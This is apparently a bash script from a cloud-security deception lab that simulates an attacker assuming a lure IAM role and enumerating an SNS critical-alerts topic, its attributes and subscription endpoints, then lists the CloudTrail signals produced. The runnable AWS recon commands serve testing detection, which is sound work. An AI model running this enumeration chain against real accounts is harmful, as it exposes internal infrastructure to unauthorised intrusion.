#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 14 (SNS Critical Alerts Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 14 — ABUSE CHAIN"
echo "  SNS Critical Alerts Topic Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: alerts-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/alerts-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing SNS topics (sns:ListTopics)"
# ---------------------------------------------------------------
attack "sns:ListTopics"
TOPICS=$(aws sns list-topics --query "Topics[].TopicArn" --output table)
echo "${TOPICS}"

TOPIC_ARN=$(aws sns list-topics \
  --query "Topics[?contains(TopicArn, 'prod-alerts-critical')].TopicArn" \
  --output text)
info "Target topic identified: ${TOPIC_ARN}"

# ---------------------------------------------------------------
step "4" "Getting topic attributes (sns:GetTopicAttributes)"
# ---------------------------------------------------------------
attack "sns:GetTopicAttributes → ${TOPIC_ARN}"
aws sns get-topic-attributes \
  --topic-arn "${TOPIC_ARN}" \
  --output json

# ---------------------------------------------------------------
step "5" "Listing subscriptions (sns:ListSubscriptionsByTopic)"
# ---------------------------------------------------------------
attack "sns:ListSubscriptionsByTopic → ${TOPIC_ARN}"
aws sns list-subscriptions-by-topic \
  --topic-arn "${TOPIC_ARN}" \
  --output json

info "Discovered subscription endpoints:"
aws sns list-subscriptions-by-topic \
  --topic-arn "${TOPIC_ARN}" \
  --query "Subscriptions[].{Protocol: Protocol, Endpoint: Endpoint}" \
  --output table

# ---------------------------------------------------------------
step "6" "Summary of extracted intelligence"
# ---------------------------------------------------------------
echo ""
warn "The following internal endpoints were discovered:"
echo ""
echo "  • HTTPS webhook: https://hooks.prod.internal.corp/alerts/critical"
echo "  • Email: oncall-sre@acme-corp.com"
echo ""
warn "Topic policy and attributes reveal internal alerting infrastructure."

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on alerts-readonly-role"
echo "  • CloudTrail: ListTopics"
echo "  • CloudTrail: GetTopicAttributes on prod-alerts-critical"
echo "  • CloudTrail: ListSubscriptionsByTopic on prod-alerts-critical"
echo ""
